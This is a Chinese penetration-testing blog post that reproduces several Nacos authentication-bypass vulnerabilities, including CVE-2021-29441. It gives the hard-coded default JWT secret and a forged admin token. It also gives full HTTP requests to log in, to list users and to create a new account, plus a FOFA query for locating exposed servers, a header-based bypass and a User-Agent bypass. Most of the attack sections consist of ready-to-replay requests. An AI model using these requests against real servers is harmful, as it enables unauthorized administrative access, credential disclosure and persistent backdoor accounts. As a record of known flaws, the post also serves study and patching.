---
title: Nacos漏洞总结复现 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17246695.html
source: 博客园 - 渗透测试中心
date: 2023-03-24
fetch_date: 2025-10-04T10:29:48.252846
---

# Nacos漏洞总结复现 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [漏洞总结复现](https://www.cnblogs.com/backlion/p/17246695.html "发布于 2023-03-23 10:57")

## Nacos漏洞总结复现

## 一、Nacos默认key导致权限绕过登陆

#

### 0x00 漏洞描述

Nacos中发现影响Nacos <= 2.1.0的问题，Nacos用户使用默认JWT密钥导致未授权访问漏洞。 通过该漏洞，攻击者可以绕过用户名密码认证，直接登录Nacos用户

### 0x01 漏洞影响

0.1.0 <= Nacos <= 2.2.0

### 0x02 漏洞搜索

fofa：app="NACOS"

### 0x03 漏洞复现

在nacos中，token.secret.key值是固定死的，位置在conf下的application.properties中：

![image.png](https://img2023.cnblogs.com/blog/1049983/202306/1049983-20230618212156624-1906122192.png)

nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789

1.获取token

利用该默认key可进行jwt构造，直接进入后台，构造方法：
在<https://jwt.io/>中：输入默认key：

SecretKey012345678901234567890123456789012345678901234567890123456789

然后再payload里面输入：

{

  "sub": "nacos",

  "exp": 1678899909

}

在这里注意：1678899909这个值是unix时间戳，换算一下，要比你系统当前的时间更晚，比如当前的时间是2023年03月15日22:11:09，在这里面的时间戳时间是3月16号了：

![image.png](https://img2023.cnblogs.com/blog/1049983/202306/1049983-20230618212156674-1268291866.png)

![image.png](https://img2023.cnblogs.com/blog/1049983/202306/1049983-20230618212156782-1940059299.png)

注意：

以下是伪造JWT值绕过权限的测试结果

1、延长时间戳，POST 密码错误，用户名正确 ✅

2、延长时间戳，POST 密码错误，用户名错误 ✅

3、删除时间戳，POST 密码错误，用户名错误 ✅

复制上面得到的值，在burp里面选择登录之后构造：

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s

![image.png](https://img2023.cnblogs.com/blog/1049983/202306/1049983-20230618212157102-716908254.png)

方框里面需要自行添加：

POST /nacos/v1/auth/users/login HTTP/1.1

Host: 10.211.55.5:8848

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0

Accept: application/json, text/plain, \*/\*

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 33

Origin: http://10.211.55.5:8848

Connection: close

Referer: http://10.211.55.5:8848/nacos/index.html

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s

username=crowsec&password=crowsec

此时就得到了token信息：

HTTP/1.1 200

Vary: Origin

Vary: Access-Control-Request-Method

Vary: Access-Control-Request-Headers

Content-Security-Policy: script-src 'self'

Set-Cookie: JSESSIONID=D90CF6E5B233685E4A39C1B1BDA9F185; Path=/nacos; HttpOnly

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s

Content-Type: application/json

Date: Wed, 15 Mar 2023 14:13:22 GMT

Connection: close

Content-Length: 197

{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s","tokenTtl":18000,"globalAdmin":true,"username":"nacos"}

此时就得到了nacos的token信息。

2.利用获取token登录后台

如何登录呢，在这里需要用假账号登录之后，再修改返回包就行了，试试看：
先用假账号登录，用burp拦截：
![image.png](https://img2023.cnblogs.com/blog/1049983/202306/1049983-20230618212157032-999061106.png)

这肯定进不去的，在这里修改返回包，右键看下这个：

![image.png](https://img2023.cnblogs.com/blog/1049983/202306/1049983-20230618212157161-2020798089.png)

然后Forward，这边返回的信息肯定是无效的：

![image.png](https://img2023.cnblogs.com/blog/1049983/202306/1049983-20230618212156623-390314247.png)

在这里使用刚刚burp里面生成的返回包进行替换，全部复制过去：

![image.png](https://img2023.cnblogs.com/blog/1049983/202306/1049983-20230618212157369-1374082680.png)

再forward一次：
![image.png](https://img2023.cnblogs.com/blog/1049983/202306/1049983-20230618212157061-424812769.png)

此时就已经进去了：

![image.png](https://img2023.cnblogs.com/blog/1049983/202306/1049983-20230618212157440-1730444466.png)

3.使用默认密钥生成的JWT查看当前用户名和密码

```
GET /nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s&pageNo=1&pageSize=9 HTTP/1.1
```

```
Host: {{Hostname}}
```

```
User-Agent: Mozilla/5.0
```

```
Accept-Encoding: gzip, deflate
```

```
Connection: close
```

```
If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT
```

```
Upgrade-Insecure-Requests: 1
```

```
accessToken: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s
```

```

```

```

```

4.利用默认密钥，添加hellonacos用户密码为hellonacos，创建成功

POST /nacos/v1/auth/users HTTP/1.1

Host: {{Hostname}}

User-Agent: Mozilla/5.0

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 39

username=hellonacos&password=hellonacos

### 二、Nacos默认配置未授权访问漏洞

http://10.10.84.207:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken

http://your\_ip:8848/nacos/v1/auth/users/?pageNo=1&pageSize=9

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230323105703727-72035024.jpg)

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230323105704604-273123776.jpg)

### 三、 Nacos2.2.0权限绕过

Header中添加serverIdentity: security能直接绕过身份验证查看用户列表

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230323105705306-318833055.jpg)

如果没有或者不对应则返回403

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230323105706016-1230883392.jpg)

### 四、Nacos1.x.x版本User-Agent权限绕过((CVE-2021-29441)

### 0x01 漏洞描述

在 1.4.1 及更早版本的 Nacos 中，当配置为使用身份验证 （Dnacos.core.auth.enabled=true） 时，会使用 AuthFilter servlet 过滤器来强制实施身份验证，从而跳过身份验证检查。此机制依赖于用户代理 HTTP 标头，因此很容易被欺骗。此问题可能允许任何用户在 Nacos 服务器上执行任何管理任务。

### 0x02 环境搭建

docker run -d -p 8848:8848 hglight/cve-2021-29441

### 0x03 漏洞影响

Nacos <= 1.4.1

### 0x04 漏洞复现

```
```
1.修改User-Agent的值为Nacos-Server到请求包中,添加Header头后访问http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9可以看到返回值为200,且内容中是否包含pageItems

GET /nacos/v1/auth/users/?pageNo=1&pageSize=9 HTTP/1.1
Host: 192.168.246.138:8848
User-Agent: Nacos-Server

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-...